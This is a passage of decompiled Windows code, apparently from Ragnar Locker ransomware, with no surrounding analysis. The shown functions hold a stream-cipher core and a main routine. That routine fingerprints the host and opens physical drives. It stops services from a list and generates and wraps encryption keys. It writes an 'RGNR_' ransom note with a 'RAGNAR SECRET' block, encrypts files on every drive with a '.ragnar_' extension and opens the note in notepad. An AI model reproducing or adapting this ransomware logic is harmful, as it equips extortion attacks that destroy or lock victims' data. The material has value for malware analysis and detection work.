  int v54; // [esp+C4h] [ebp-1Ch]
  int v55; // [esp+C8h] [ebp-18h]
  int v56; // [esp+CCh] [ebp-14h]
  int v57; // [esp+D0h] [ebp-10h]
  unsigned int v58; // [esp+D4h] [ebp-Ch]
  unsigned int v59; // [esp+D8h] [ebp-8h]
  unsigned int v60; // [esp+DCh] [ebp-4h]
  int v61; // [esp+F4h] [ebp+14h]
  int v62; // [esp+F4h] [ebp+14h]
  int v63; // [esp+F4h] [ebp+14h]

  v57 = a4;
  result = HIDWORD(a4) | a4;
  v43 = this;
  v48 = HIDWORD(a4);
  if ( a4 )
  {
    v34 = (char *)this - v33;
    do
    {
      v5 = *(_OWORD *)this;
      v58 = 10;
      v38 = v5;
      v6 = DWORD1(v5);
      v7 = *((_OWORD *)this + 1);
      v49 = v6;
      v39 = v7;
      v40 = *((_OWORD *)this + 2);
      v8 = HIDWORD(v40);
      v9 = *((_OWORD *)this + 3);
      v10 = v38;
      v59 = HIDWORD(v40);
      v41 = v9;
      v11 = v9;
      v52 = DWORD2(v9);
      v61 = DWORD1(v9);
      v53 = DWORD2(v40);
      v54 = DWORD1(v40);
      v55 = v40;
      v45 = HIDWORD(v39);
      v44 = DWORD1(v39);
      v56 = v39;
      v51 = HIDWORD(v9);
      v12 = DWORD2(v39);
      v46 = HIDWORD(v38);
      v50 = DWORD2(v39);
      v47 = DWORD2(v38);
      v60 = v38;
      do
      {
        v56 ^= __ROL4__(v10 + v11, 7);
        v37 = v55 ^ __ROL4__(v56 + v10, 9);
        v35 = v11 ^ __ROL4__(v37 + v56, 13);
        v60 ^= __ROR4__(v37 + v35, 14);
        v55 = v54 ^ __ROL4__(v6 + v44, 7);
        HIDWORD(v42) = v61 ^ __ROL4__(v55 + v44, 9);
        v13 = v49 ^ __ROL4__(v55 + HIDWORD(v42), 13);
        v54 = v44 ^ __ROR4__(v13 + HIDWORD(v42), 14);
        v36 = v52 ^ __ROL4__(v12 + v53, 7);
        v14 = v47 ^ __ROL4__(v36 + v53, 9);
        v52 = v50 ^ __ROL4__(v14 + v36, 13);
        v53 ^= __ROR4__(v14 + v52, 14);
        v15 = v46 ^ __ROL4__(v8 + v51, 7);
        v16 = v45 ^ __ROL4__(v15 + v51, 9);
        v59 ^= __ROL4__(v16 + v15, 13);
        v62 = v51 ^ __ROR4__(v16 + v59, 14);
        v49 = v13 ^ __ROL4__(v15 + v60, 7);
        v47 = v14 ^ __ROL4__(v49 + v60, 9);
        DWORD2(v38) = v47;
        v46 = v15 ^ __ROL4__(v47 + v49, 13);
        HIDWORD(v38) = v46;
        v60 ^= __ROR4__(v47 + v46, 14);
        *(_QWORD *)&v38 = __PAIR64__(v49, v60);
        v50 = v52 ^ __ROL4__(v56 + v54, 7);
        v12 = v50;
        v45 = v16 ^ __ROL4__(v54 + v50, 9);
        HIDWORD(v39) = v45;
        v56 ^= __ROL4__(v45 + v50, 13);
        LODWORD(v39) = v56;
        v44 = v54 ^ __ROR4__(v56 + v45, 14);
        *(_QWORD *)((char *)&v39 + 4) = __PAIR64__(v50, v44);
        v17 = v55;
        v59 ^= __ROL4__(v55 + v53, 7);
        v55 = v37 ^ __ROL4__(v53 + v59, 9);
        LODWORD(v40) = v55;
        v54 = v17 ^ __ROL4__(v55 + v59, 13);
        DWORD1(v40) = v54;
        v18 = v62;
        v53 ^= __ROR4__(v54 + v55, 14);
        *((_QWORD *)&v40 + 1) = __PAIR64__(v59, v53);
        v11 = v35 ^ __ROL4__(v62 + v36, 7);
        v61 = HIDWORD(v42) ^ __ROL4__(v62 + v11, 9);
        DWORD1(v41) = v61;
        v52 = v36 ^ __ROL4__(v61 + v11, 13);
        DWORD2(v41) = v52;
        v8 = v59;
        v6 = v49;
        v19 = v58-- == 1;
        v51 = v18 ^ __ROR4__(v52 + v61, 14);
        HIDWORD(v41) = v51;
        v10 = v60;
      }
      while ( !v19 );
      LODWORD(v41) = v11;
      for ( i = 0; i < 0x40; i += 4 )
      {
        v21 = &v33[i];
        *(_DWORD *)((char *)&v38 + i) += *(_DWORD *)&v33[i + v34];
        v22 = *(_DWORD *)((char *)&v38 + i);
        *(v21 - 1) = BYTE1(v22);
        v32[i] = v22;
        *v21 = BYTE2(v22);
        v21[1] = HIBYTE(v22);
      }
      this = v43;
      v23 = v48;
      v24 = v57;
      v19 = v43[8]++ == -1;
      this[9] += v19;
      if ( v23 < 0 || v23 <= 0 && v24 < 0x40 )
      {
        v58 = v24;
        v63 = v23;
        if ( v23 < 0 || !v24 )
          goto LABEL_16;
      }
      else
      {
        v58 = 64;
        v63 = 0;
      }
      v25 = a3;
      v42 = 0i64;
      v26 = 0;
      v27 = 0;
      do
      {
        v28 = a2++;
        v29 = *v28 ^ v32[v27];
        v30 = v48;
        *v25++ = v29;
        v26 = (__PAIR64__(v26, v27++) + 1) >> 32;
        v31 = v24 - 1;
        v23 = (__PAIR64__(v30, v24--) - 1) >> 32;
        v48 = v23;
      }
      while ( __SPAIR64__(v26, v27) < __SPAIR64__(v63, v58) );
      this = v43;
      a3 = v25;
      v57 = v31;
LABEL_16:
      result = v23 | v24;
    }
    while ( v23 | v24 );
  }
  return result;
}
// 4026B0: conditional instruction was optimized away because esi.4==0
// 402380: using guessed type char var_E0[2];

//----- (00402720) --------------------------------------------------------
int __thiscall sub_402720(char *this, unsigned __int8 *a2, unsigned __int8 *a3)
{
  int result; // eax

  if ( a2 )
  {
    *(_DWORD *)this = *a3 | ((a3[1] | (*((unsigned __int16 *)a3 + 1) << 8)) << 8);
    *((_DWORD *)this + 1) = *a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8);
    *((_DWORD *)this + 2) = a2[4] | ((a2[5] | (*((unsigned __int16 *)a2 + 3) << 8)) << 8);
    *((_DWORD *)this + 3) = a2[8] | ((a2[9] | (*((unsigned __int16 *)a2 + 5) << 8)) << 8);
    *((_DWORD *)this + 4) = a2[12] | ((a2[13] | (*((unsigned __int16 *)a2 + 7) << 8)) << 8);
    *((_DWORD *)this + 5) = a3[4] | ((a3[5] | (*((unsigned __int16 *)a3 + 3) << 8)) << 8);
    *(_OWORD *)(this + 24) = 0i64;
    *((_DWORD *)this + 10) = a3[8] | ((a3[9] | (*((unsigned __int16 *)a3 + 5) << 8)) << 8);
    *((_DWORD *)this + 11) = a2[16] | ((a2[17] | (*((unsigned __int16 *)a2 + 9) << 8)) << 8);
    *((_DWORD *)this + 12) = a2[20] | ((a2[21] | (*((unsigned __int16 *)a2 + 11) << 8)) << 8);
    *((_DWORD *)this + 13) = a2[24] | ((a2[25] | (*((unsigned __int16 *)a2 + 13) << 8)) << 8);
    *((_DWORD *)this + 14) = a2[28] | ((a2[29] | (*((unsigned __int16 *)a2 + 15) << 8)) << 8);
    result = a3[12];
    *((_DWORD *)this + 15) = result | ((a3[13] | (*((unsigned __int16 *)a3 + 7) << 8)) << 8);
  }
  return result;
}

//----- (004028E0) --------------------------------------------------------
_BYTE *__cdecl sub_4028E0(int a1, _BYTE *a2)
{
  _BYTE *v2; // ebx
  _BYTE *result; // eax
  int v4; // edi
  _BYTE *v5; // esi
  _BYTE *v6; // ecx
  _BYTE *v7; // edx
  char v8; // al
  char v9; // cl
  char v10; // dl
  _BYTE *v11; // ebx
  _BYTE *v12; // ecx
  _BYTE *v13; // esi
  char v14; // al

  v2 = (_BYTE *)a1;
  if ( !a1 )
  {
    v2 = (_BYTE *)dword_40A000;
    a1 = dword_40A000;
    if ( !dword_40A000 )
      return 0;
  }
  v4 = 0;
  v5 = v2;
  if ( *v2 )
  {
    v6 = a2;
    do
    {
      v7 = v6;
      v8 = *a2;
      if ( *a2 )
      {
        v9 = *a2;
        do
        {
          v8 = v9;
          if ( *v5 == v9 )
            break;
          v8 = *++v7;
          v9 = v8;
        }
        while ( v8 );
        v6 = a2;
      }
      if ( !v8 )
        break;
      ++v5;
      ++v4;
    }
    while ( *v5 );
    v2 = (_BYTE *)a1;
  }
  v10 = v2[v4];
  v11 = &v2[v4];
  if ( v10 )
  {
    v12 = a2;
    v13 = v11;
    while ( 1 )
    {
      v14 = *a2;
      if ( *a2 == v10 )
        break;
      while ( v14 )
      {
        v14 = *++v12;
        if ( v14 == v10 )
          goto LABEL_20;
      }
      v10 = *++v13;
      if ( !v10 )
        goto LABEL_21;
      v12 = a2;
    }
LABEL_20:
    if ( !v13 )
    {
LABEL_21:
      result = v11;
      dword_40A000 = 0;
      return result;
    }
    *v13 = 0;
    result = v11;
    dword_40A000 = (int)(v13 + 1);
  }
  else
  {
    dword_40A000 = 0;
    return 0;
  }
  return result;
}
// 40A000: using guessed type int dword_40A000;

//----- (004029B0) --------------------------------------------------------
void __usercall __noreturn start(int a1@<edi>, int a2@<esi>)
{
  void *v2; // esp
  BYTE *v3; // edi
  BYTE *v4; // esi
  WCHAR *v5; // edi
  WCHAR *v6; // esi
  WCHAR *v7; // eax
  int i; // esi
  HANDLE EventW; // edi
  HANDLE CurrentProcess; // eax
  int v11; // edi
  HANDLE FileW; // esi
  HANDLE FirstVolumeA; // edi
  DWORD LogicalDrives; // edx
  char j; // cl
  int v16; // eax
  int v17; // eax
  HANDLE (__stdcall *v18)(); // esi
  SC_HANDLE v19; // edi
  DWORD v20; // esi
  HANDLE ProcessHeap; // eax
  LPCSTR *p_lpServiceName; // esi
  const CHAR *v23; // ecx
  DWORD v24; // edi
  HANDLE v25; // eax
  const CHAR *v26; // edi
  HANDLE v27; // eax
  HCRYPTPROV *v28; // esi
  HANDLE v29; // eax
  unsigned int v30; // esi
  int v31; // edi
  int k; // edx
  int v33; // ecx
  const WCHAR *v34; // esi
  int v35; // esi
  HANDLE v36; // eax
  void *v37; // edi
  HANDLE v38; // eax
  _BYTE *v39; // eax
  DWORD m; // ecx
  HANDLE v41; // eax
  WCHAR *v42; // eax
  int v43; // eax
  DWORD v44; // eax
  int v45; // edi
  int v46; // esi
  HANDLE v47; // eax
  DWORD v48; // [esp-1920h] [ebp-192Ch]
  SIZE_T v49; // [esp-1914h] [ebp-1920h]
  LPCSTR *v50; // [esp-1914h] [ebp-1920h]
  unsigned int v51; // [esp-1914h] [ebp-1920h]
  SIZE_T v52; // [esp-1914h] [ebp-1920h]
  WCHAR v55[520]; // [esp-1900h] [ebp-190Ch] BYREF
  WCHAR v56[256]; // [esp-14F0h] [ebp-14FCh] BYREF
  CHAR v57; // [esp-12F0h] [ebp-12FCh] BYREF
  CHAR v58; // [esp-11F0h] [ebp-11FCh] BYREF
  WCHAR v59; // [esp-10F0h] [ebp-10FCh] BYREF
  WCHAR v60[260]; // [esp-FF0h] [ebp-FFCh] BYREF
  WCHAR v61[260]; // [esp-DE8h] [ebp-DF4h] BYREF
  WCHAR v62[260]; // [esp-BE0h] [ebp-BECh] BYREF
  WCHAR v63[128]; // [esp-9D8h] [ebp-9E4h] BYREF
  WCHAR v64[128]; // [esp-8D8h] [ebp-8E4h] BYREF
  WCHAR v65[128]; // [esp-7D8h] [ebp-7E4h] BYREF
  WCHAR v66[128]; // [esp-6D8h] [ebp-6E4h] BYREF
  WCHAR v67[88]; // [esp-5D8h] [ebp-5E4h] BYREF
  CHAR v68; // [esp-528h] [ebp-534h] BYREF
  _BYTE v69[3]; // [esp-527h] [ebp-533h] BYREF
  CHAR v70[256]; // [esp-428h] [ebp-434h] BYREF
  WCHAR v71[128]; // [esp-328h] [ebp-334h] BYREF
  CHAR v72[132]; // [esp-228h] [ebp-234h] BYREF
  struct _ENUM_SERVICE_STATUSA v73; // [esp-1A4h] [ebp-1B0h] BYREF
  CHAR v74[128]; // [esp-180h] [ebp-18Ch] BYREF
  struct _STARTUPINFOW v75; // [esp-100h] [ebp-10Ch] BYREF
  _DWORD v76[2]; // [esp-B0h] [ebp-BCh] BYREF
  __int64 v77; // [esp-A8h] [ebp-B4h]
  __int128 v78; // [esp-A0h] [ebp-ACh]
  __int64 v79; // [esp-90h] [ebp-9Ch]
  struct _PROCESS_INFORMATION v80; // [esp-80h] [ebp-8Ch] BYREF
  DWORD v81; // [esp-6Ch] [ebp-78h] BYREF
  wchar_t v82[10]; // [esp-68h] [ebp-74h] BYREF
  DWORD active; // [esp-54h] [ebp-60h] BYREF
  DWORD v84; // [esp-50h] [ebp-5Ch] BYREF
  DWORD v85; // [esp-4Ch] [ebp-58h] BYREF
  DWORD v86; // [esp-48h] [ebp-54h] BYREF
  DWORD v87; // [esp-44h] [ebp-50h] BYREF
  DWORD v88; // [esp-40h] [ebp-4Ch] BYREF
  DWORD v89; // [esp-3Ch] [ebp-48h] BYREF
  int v90; // [esp-38h] [ebp-44h] BYREF
  DWORD v91; // [esp-34h] [ebp-40h] BYREF
  LPCSTR v92; // [esp-30h] [ebp-3Ch]
  DWORD v93; // [esp-2Ch] [ebp-38h] BYREF
  WCHAR v94; // [esp-28h] [ebp-34h] BYREF
  int v95; // [esp-26h] [ebp-32h]
  __int16 v96; // [esp-22h] [ebp-2Eh]
  LPCVOID VolumeInformationW; // [esp-20h] [ebp-2Ch]
  HANDLE v98; // [esp-1Ch] [ebp-28h] BYREF
  DWORD v99; // [esp-18h] [ebp-24h] BYREF
  DWORD v100; // [esp-14h] [ebp-20h] BYREF
  __int16 v101; // [esp-10h] [ebp-1Ch] BYREF
  struct _ENUM_SERVICE_STATUSA *v102; // [esp-Ch] [ebp-18h]
  WCHAR *v103; // [esp-8h] [ebp-14h]
  const CHAR *v104; // [esp-4h] [ebp-10h]
  int v105; // [esp+4h] [ebp-8h]
  int retaddr; // [esp+Ch] [ebp+0h]

  v105 = retaddr;
  v2 = alloca(6408);
  sub_401D60();
  v88 = 257;
  v87 = 257;
  GetComputerNameW(v62, &v88);
  GetUserNameW(v61, &v87);
  lstrcpyW(&v59, L"SOFTWARE\\Microsoft\\Cryptography");
  v3 = sub_402230(L"SOFTWARE\\Microsoft\\Cryptography", L"MachineGuid");
  v4 = sub_402230(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ProductName");
  lstrcpyW(v71, (LPCWSTR)v3);
  lstrcatW(v71, (LPCWSTR)v4);
  lstrcatW(v71, v61);
  lstrcatW(v71, v62);
  v103 = sub_4022B0(v62);
  v102 = (struct _ENUM_SERVICE_STATUSA *)sub_4022B0(v61);
  v5 = sub_4022B0((LPCWSTR)v3);
  v6 = sub_4022B0((LPCWSTR)v4);
  v7 = sub_4022B0(v71);
  wsprintfW(v67, L"%s-%s-%s-%s-%s", v5, v6, v102, v103, v7);
  for ( i = 0; i < 64233; ++i )
  {
    EventW = CreateEventW(0, 1, 0, v67);
    if ( GetLastError() != 183 )
      break;
    CloseHandle(EventW);
    if ( i == 0x8000 )
    {
      CurrentProcess = GetCurrentProcess();
      TerminateProcess(CurrentProcess, 0x29Au);
    }
  }
  v11 = 0;
  while ( 1 )
  {
    wsprintfW(v63, L"\\\\.\\PHYSICALDRIVE%d", v11);
    FileW = CreateFileW(v63, 0xC0000000, 7u, 0, 3u, 1u, 0);
    if ( FileW != (HANDLE)-1 )
    {
      v91 = 0;
      v76[1] = 0;
      v78 = 0i64;
      v79 = 0i64;
      v76[0] = 40;
      v77 = 0i64;
      *(_QWORD *)&v78 = 3i64;
      DeviceIoControl(FileW, 0x7C0F4u, v76, 0x28u, 0, 0, &v91, 0);
      DeviceIoControl(FileW, 0x70140u, 0, 0, 0, 0, &v91, 0);
    }
    CloseHandle(FileW);
    if ( ++v11 >= 16 )
    {
      v90 = 6044192;
      FirstVolumeA = FindFirstVolumeA(v70, 0x100u);
      while ( 1 )
      {
        GetVolumePathNamesForVolumeNameA(v70, &v68, 0x100u, &v86);
        if ( &v69[strlen(&v68)] == v69 )
        {
          LogicalDrives = GetLogicalDrives();
          if ( LogicalDrives >= 4 )
          {
            v16 = 4;
            for ( j = 67; (v16 & LogicalDrives) != 0; ++j )
              v16 *= 2;
          }
          else
          {
            j = 0;
          }
          LOBYTE(v90) = j;
          if ( SetVolumeMountPointA((LPCSTR)&v90, v70) )
            GetVolumePathNamesForVolumeNameA(v70, &v68, 0x100u, &v86);
        }
        GetVolumeInformationA(&v68, &v57, 0x100u, &v81, 0, 0, &v58, 0x100u);
        if ( !FindNextVolumeA(FirstVolumeA, v70, 0x100u) )
        {
          FindVolumeClose(FirstVolumeA);
          sub_403390(pbBuffer, 40);
          sub_403390(byte_40A338, 32);
          v92 = (LPCSTR)sub_402150((int)aFjtqrhKYQq15k7, 0x40u, (int)dword_40B048, 64);
          v17 = StrToIntA(pszSrc);
          v104 = (const CHAR *)sub_402150((int)aFjtqrhKYQq15k7, 0x40u, (int)dword_40B260, v17);
          v18 = GetProcessHeap;
          v19 = OpenSCManagerA(0, 0, 0xF003Fu);
          v103 = (WCHAR *)v19;
          if ( v19 )
          {
            v93 = 0;
            v100 = 0;
            v89 = 0;
            if ( !EnumServicesStatusA(v19, 0x3Bu, 3u, &v73, 0x24u, &v93, &v100, &v89) && GetLastError() == 234 )
            {
              v20 = v93 + 36;
              v49 = v93 + 36;
              ProcessHeap = GetProcessHeap();
              v102 = (struct _ENUM_SERVICE_STATUSA *)HeapAlloc(ProcessHeap, 8u, v49);
              v48 = v20;
              p_lpServiceName = (LPCSTR *)&v102->lpServiceName;
              EnumServicesStatusA(v19, 0x3Bu, 3u, v102, v48, &v93, &v100, &v89);
              v101 = 44;
              v23 = sub_4028E0((int)v104, &v101);
              v104 = v23;
              if ( v23 )
              {
                do
                {
                  v24 = 0;
                  if ( v100 )
                  {
                    do
                    {
                      if ( *p_lpServiceName )
                      {
                        if ( StrStrIA(*p_lpServiceName, v23) )
                          sub_401200(*p_lpServiceName, (SC_HANDLE)v103);
                        v23 = v104;
                      }
                      ++v24;
                      p_lpServiceName += 9;
                    }
                    while ( v24 < v100 );
                    p_lpServiceName = (LPCSTR *)&v102->lpServiceName;
                  }
                  v23 = sub_4028E0(0, &v101);
                  v104 = v23;
                }
                while ( v23 );
                v19 = (SC_HANDLE)v103;
              }
              v50 = p_lpServiceName;
              v18 = GetProcessHeap;
              v25 = GetProcessHeap();
              HeapFree(v25, 1u, v50);
            }
            CloseServiceHandle(v19);
          }
          sub_401000();
          v26 = (const CHAR *)sub_402150((int)aFjtqrhKYQq15k7, 0x40u, (int)dword_40B090, 451);
          v104 = (const CHAR *)StrToIntA(a3629);
          VolumeInformationW = (LPCVOID)sub_402150((int)aFjtqrhKYQq15k7, 0x40u, (int)dword_40B668, (int)v104);
          v27 = v18();
          v28 = (HCRYPTPROV *)HeapAlloc(v27, 8u, 8u);
          sub_402000(v28, v26);
          sub_401910(v28, pbBuffer, 0x28u, (BYTE **)&lpBuffer);
          sub_401910(v28, byte_40A338, 0x20u, (BYTE **)&dword_40A008);
          v29 = GetProcessHeap();
          HeapFree(v29, 0, v28);
          v85 = 257;
          GetComputerNameW(v60, &v85);
          v102 = (struct _ENUM_SERVICE_STATUSA *)VirtualAlloc(0, 0x7Fu, 0x3000u, 4u);
          v30 = 0;
          v31 = lstrlenW(v60);
          for ( k = 0; k < v31; v30 = (v33 ^ 0xAB01FF3C) + v30 - __ROL4__((v33 ^ 0xAB01FF3C) + v30, 13) )
            v33 = v60[k++];
          v51 = v30;
          v34 = (const WCHAR *)v102;
          wsprintfW((LPWSTR)v102, L"%08X", v51, a1, a2);
          lstrcpyW(v66, L"\\");
          lstrcpyW(&String1, L"RGNR_");
          lstrcatW(&String1, v34);
          lstrcatW(&String1, L".txt");
          lstrcatW(v66, &String1);
          SHGetSpecialFolderPathW(0, &FileName, 46, 0);
          lstrcatW(&FileName, v66);
          lstrcpyA(v74, v92);
          v35 = lstrlenA(v74);
          v36 = GetProcessHeap();
          v37 = HeapAlloc(v36, 8u, 0x58u);
          v99 = 0;
          if ( CryptBinaryToStringA((const BYTE *)v74, v35, 0x40000001u, 0, &v99) )
          {
            v52 = v99;
            v38 = GetProcessHeap();
            v39 = HeapAlloc(v38, 8u, v52);
            v37 = v39;
            if ( v39 )
            {
              for ( m = v99; m; --m )
                *v39++ = 0;
              if ( !CryptBinaryToStringA((const BYTE *)v74, v35, 0x40000001u, (LPSTR)v37, &v99) )
              {
                v41 = GetProcessHeap();
                HeapFree(v41, 0, v37);
              }
            }
          }
          v42 = (WCHAR *)CreateFileW(&FileName, 0xC0000000, 0, 0, 4u, 0x80u, 0);
          v103 = v42;
          if ( v42 )
          {
            WriteFile(v42, VolumeInformationW, (DWORD)v104, &v84, 0);
            wsprintfA(
              v72,
              "\r\n%s\r\n\r\n%s\r\n%s\r\n%s\r\n\r\n%s\r\n",
              "***********************************************************************************",
              "---RAGNAR SECRET---",
              (const char *)v37,
              "---RAGNAR SECRET---",
              "***********************************************************************************");
            v43 = lstrlenA(v72);
            WriteFile(v103, v72, v43, &v84, 0);
            v42 = v103;
          }
          CloseHandle(v42);
          lstrcpyW(&String2, L".ragnar_");
          lstrcatW(&String2, (LPCWSTR)v102);
          v44 = GetLogicalDrives();
          v45 = 26;
          v92 = (LPCSTR)v44;
          while ( 1 )
          {
            if ( ((v44 >> v45) & 1) != 0 )
            {
              v95 = 6029370;
              v94 = v45 + 65;
              v46 = 0;
              v96 = 0;
              VolumeInformationW = (LPCVOID)GetVolumeInformationW(&v94, 0, 0x104u, 0, 0, 0, 0, 0);
              if ( GetDriveTypeW(&v94) != 5 && VolumeInformationW == (LPCVOID)1 )
              {
                GetWindowsDirectoryW(v65, 0xFEu);
                if ( v65[0] == v94 )
                  v46 = v65[1] == (unsigned __int16)v95;
                wcscpy(v82, L"\\\\?\\");
                v82[5] = 0;
                lstrcpyW(v55, v82);
                lstrcatW(v55, &v94);
                lstrcatW(v55, L"*.*");
                sub_4019A0(v55, v46, (LPWSTR)1);
              }
            }
            --v45;
            v44 = (DWORD)v92;
            if ( v45 < 0 )
            {
              memset(&v75, 0, sizeof(v75));
              v80 = 0i64;
              v75.cb = 68;
              active = WTSGetActiveConsoleSessionId();
              v47 = GetCurrentProcess();
              OpenProcessToken(v47, 0xF01FFu, &v98);
              DuplicateTokenEx(v98, 0xF01FFu, 0, SecurityAnonymous, TokenPrimary, &v98);
              SetTokenInformation(v98, TokenSessionId, &active, 4u);
              v75.dwFlags = 1;
              v75.wShowWindow = 3;
              v75.lpDesktop = L"WinSta0\\Default";
              GetSystemDirectoryW(v64, 0x7Fu);
              lstrcatW(v64, L"\\notepad.exe");
              wsprintfW(v56, L" %s", &FileName);
              if ( CreateProcessAsUserW(v98, v64, v56, 0, 0, 0, 0x30u, 0, 0, &v75, &v80) )
              {
                CloseHandle(v80.hProcess);
                CloseHandle(v80.hThread);
              }
              ExitProcess(0);
            }
          }
        }
      }
    }
  }
}
// 408660: using guessed type wchar_t aWinsta0Default[16];
// 40A310: using guessed type BYTE pbBuffer[32];
// 40A338: using guessed type BYTE byte_40A338[3272];
// 40B048: using guessed type int dword_40B048[18];
// 40B090: using guessed type int dword_40B090[113];
// 40B260: using guessed type int dword_40B260[256];
// 40B668: using guessed type int dword_40B668[512];

//----- (00403390) --------------------------------------------------------
void __cdecl sub_403390(BYTE *pbBuffer, int dwLen)
{
  unsigned __int8 *v2; // edi
  signed int v3; // esi
  _DWORD v4[54]; // [esp+8h] [ebp-11Ch] BYREF
  char v5[64]; // [esp+E0h] [ebp-44h] BYREF
  HCRYPTPROV phProv; // [esp+120h] [ebp-4h] BYREF

  CryptAcquireContextW(&phProv, 0, 0, 1u, 0xF0000000);
  v2 = pbBuffer;
  v3 = dwLen;
  CryptGenRandom(phProv, dwLen, pbBuffer);
  CryptReleaseContext(phProv, 0);
  if ( dwLen > 0 )
  {
    while ( 1 )
    {
      sub_407400(v4);
      sub_4074B0((int)v4, byte_4086A8, 0x40u);
      sub_4074B0((int)v4, v2, v3);
      if ( v3 <= 64 )
        break;
      sub_4070F0(v2, (int)v4);
      v3 -= 64;
      v2 += 64;
      if ( v3 <= 0 )
        return;
    }
    sub_4070F0(v5, (int)v4);
    sub_4075F0(v2, v5, v3);
  }
}
// 4086A8: using guessed type unsigned __int8 byte_4086A8[64];
// 403390: using guessed type _DWORD var_11C[54];

//----- (00403450) --------------------------------------------------------
unsigned int *__cdecl sub_403450(unsigned int *a1, unsigned __int8 *a2)
{
  unsigned int v2; // ecx
  unsigned __int64 v3; // rt0
  unsigned int v4; // ebx
  unsigned int v5; // edi
  unsigned __int64 v6; // kr00_8
  unsigned __int64 v7; // kr80_8
  unsigned __int64 v8; // kr98_8
  unsigned int v9; // ecx
  unsigned __int64 v10; // kr08_8
  unsigned __int64 v11; // krA8_8
  unsigned __int64 v12; // krB0_8
  unsigned int v13; // ecx
  unsigned __int64 v14; // krC0_8
  unsigned __int64 v15; // krD0_8
  unsigned int v16; // ecx
  unsigned __int64 v17; // kr10_8
  unsigned __int64 v18; // krE0_8
  __int64 v19; // rax
  unsigned int v20; // ecx
  unsigned __int64 v21; // krF0_8
  unsigned __int64 v22; // kr100_8
  unsigned int v23; // ecx
  unsigned __int64 v24; // kr110_8
  unsigned __int64 v25; // kr120_8
  unsigned __int64 v26; // kr130_8
  unsigned __int64 v27; // kr140_8
  unsigned int v28; // kr2C_4
  unsigned __int64 v29; // kr148_8
  unsigned __int64 v30; // kr158_8
  unsigned __int64 v31; // kr170_8
  unsigned __int64 v32; // kr18_8
  unsigned __int64 v33; // kr188_8
  unsigned __int64 v34; // kr20_8
  unsigned __int64 v35; // kr1A0_8
  unsigned __int64 v36; // kr68_8
  unsigned __int64 v37; // kr1B8_8
  unsigned __int64 v38; // kr88_8
  unsigned __int64 v39; // kr1D0_8
  unsigned __int64 v40; // kr90_8
  unsigned __int64 v41; // kr1E8_8
  _QWORD *v42; // eax
  unsigned int v43; // edx
  unsigned __int64 v44; // kr200_8
  unsigned __int64 v45; // kr208_8
  int v46; // kr3C_4
  unsigned __int64 v47; // kr210_8
  unsigned int v48; // edx
  __int64 v49; // rcx
  __int64 v50; // rdi
  unsigned __int64 v51; // kr228_8
  unsigned __int64 v52; // krA0_8
  unsigned __int64 v53; // krC8_8
  unsigned __int64 v54; // kr248_8
  unsigned __int64 v55; // krD8_8
  __int64 v56; // kr250_8
  unsigned __int64 v57; // krF8_8
  unsigned __int64 v58; // rcx
  unsigned int v59; // et2
  unsigned __int64 v60; // kr118_8
  unsigned __int64 v61; // kr280_8
  unsigned __int64 v62; // kr138_8
  __int64 v63; // kr288_8
  unsigned __int64 v64; // kr150_8
  unsigned __int64 v65; // kr2A0_8
  unsigned __int64 v66; // kr2A8_8
  unsigned __int64 v67; // kr160_8
  unsigned __int64 v68; // kr2C0_8
  unsigned __int64 v69; // kr168_8
  unsigned __int64 v70; // kr2C8_8
  unsigned __int64 v71; // kr2D8_8
  unsigned __int64 v72; // kr178_8
  unsigned __int64 v73; // kr2E0_8
  unsigned __int64 v74; // kr180_8
  unsigned __int64 v75; // rcx
  unsigned int v76; // kr310_4
  unsigned __int64 v77; // kr190_8
  unsigned __int64 v78; // kr328_8
  unsigned __int64 v79; // kr198_8
  unsigned __int64 v80; // kr1A8_8
  unsigned __int64 v81; // kr350_8
  unsigned __int64 v82; // kr1B0_8
  unsigned __int64 v83; // kr378_8
  unsigned __int64 v84; // kr1C0_8
  unsigned __int64 v85; // kr1C8_8
  unsigned __int64 v86; // kr3A0_8
  unsigned __int64 v87; // kr1D8_8
  unsigned __int64 v88; // kr3C8_8
  unsigned __int64 v89; // kr1E0_8
  unsigned __int64 v90; // kr1F0_8
  unsigned __int64 v91; // kr3F0_8
  unsigned __int64 v92; // kr1F8_8
  unsigned int v93; // edx
  unsigned int v94; // kr78_4
  unsigned int *result; // eax
  unsigned __int64 v96; // kr408_8
  unsigned int v97; // [esp+Ch] [ebp-11Ch]
  unsigned int v98; // [esp+10h] [ebp-118h]
  unsigned int v99; // [esp+14h] [ebp-114h]
  unsigned int v100; // [esp+18h] [ebp-110h]
  unsigned int v101; // [esp+1Ch] [ebp-10Ch]
  unsigned int v102; // [esp+20h] [ebp-108h]
  unsigned int v103; // [esp+28h] [ebp-100h]
  unsigned int v104; // [esp+2Ch] [ebp-FCh]
  unsigned int v105; // [esp+30h] [ebp-F8h]
  unsigned int v106; // [esp+34h] [ebp-F4h]
  unsigned int v107; // [esp+38h] [ebp-F0h]
  unsigned int v108; // [esp+3Ch] [ebp-ECh]
  unsigned int v109; // [esp+40h] [ebp-E8h]
  unsigned __int64 v110; // [esp+44h] [ebp-E4h]
  __int64 v111; // [esp+4Ch] [ebp-DCh]
  unsigned int v112; // [esp+54h] [ebp-D4h]
  __int64 v113; // [esp+58h] [ebp-D0h]
  unsigned int v114; // [esp+60h] [ebp-C8h]
  __int64 v115; // [esp+64h] [ebp-C4h]
  int v116; // [esp+6Ch] [ebp-BCh]
  __int64 v117; // [esp+70h] [ebp-B8h]
  int v118; // [esp+78h] [ebp-B0h]
  __int64 v119; // [esp+7Ch] [ebp-ACh]
  __int64 v120; // [esp+84h] [ebp-A4h]
  __int64 v121; // [esp+8Ch] [ebp-9Ch]
  unsigned int v122; // [esp+94h] [ebp-94h]
  int v123; // [esp+98h] [ebp-90h]
  __int64 v124; // [esp+9Ch] [ebp-8Ch]
  __int64 v125; // [esp+A4h] [ebp-84h]
  __int64 v126; // [esp+ACh] [ebp-7Ch]
  __int64 v127; // [esp+B4h] [ebp-74h]
  unsigned __int64 v128; // [esp+BCh] [ebp-6Ch]
  unsigned __int64 v129; // [esp+BCh] [ebp-6Ch]
  int v130; // [esp+C4h] [ebp-64h]
  __int64 v131; // [esp+C4h] [ebp-64h]
  int v132; // [esp+C8h] [ebp-60h]
  unsigned __int64 v133; // [esp+D4h] [ebp-54h]
  unsigned __int64 v134; // [esp+D4h] [ebp-54h]
  unsigned __int64 v135; // [esp+D4h] [ebp-54h]
  unsigned int v136; // [esp+DCh] [ebp-4Ch]
  int v137; // [esp+DCh] [ebp-4Ch]
